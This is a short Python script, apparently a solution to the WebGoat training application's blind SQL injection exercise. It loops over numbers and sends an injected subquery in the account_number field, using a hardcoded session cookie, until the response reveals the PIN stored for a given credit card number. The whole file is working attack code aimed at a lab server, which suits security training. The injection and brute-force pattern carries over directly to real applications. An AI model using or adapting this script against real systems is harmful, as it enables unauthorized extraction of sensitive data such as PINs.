import requests, sys 
URL="http://192.168.10.50:8080/WebGoat/attack?Screen=586116895&menu=1100"
cookie={
    'JSESSIONID': '9B42439A811AF840F234F484CD3580CC'
}

session=requests.Session() 
num=0

while True:
    inject='101 and (select pin from pins where cc_number=1111222233334444)='+str(num)

    data1={
        'account_number': inject,
        'SUBMIT': 'GO!'
        }
    res=session.post(URL, cookies=cookie, data=data1)
    
    if res.text.find('Invalid account number.') == -1:
        print ('Pin is : '+str(num))
        break
    else :
        print ('no.. : '+str(num))
    num+=1
    
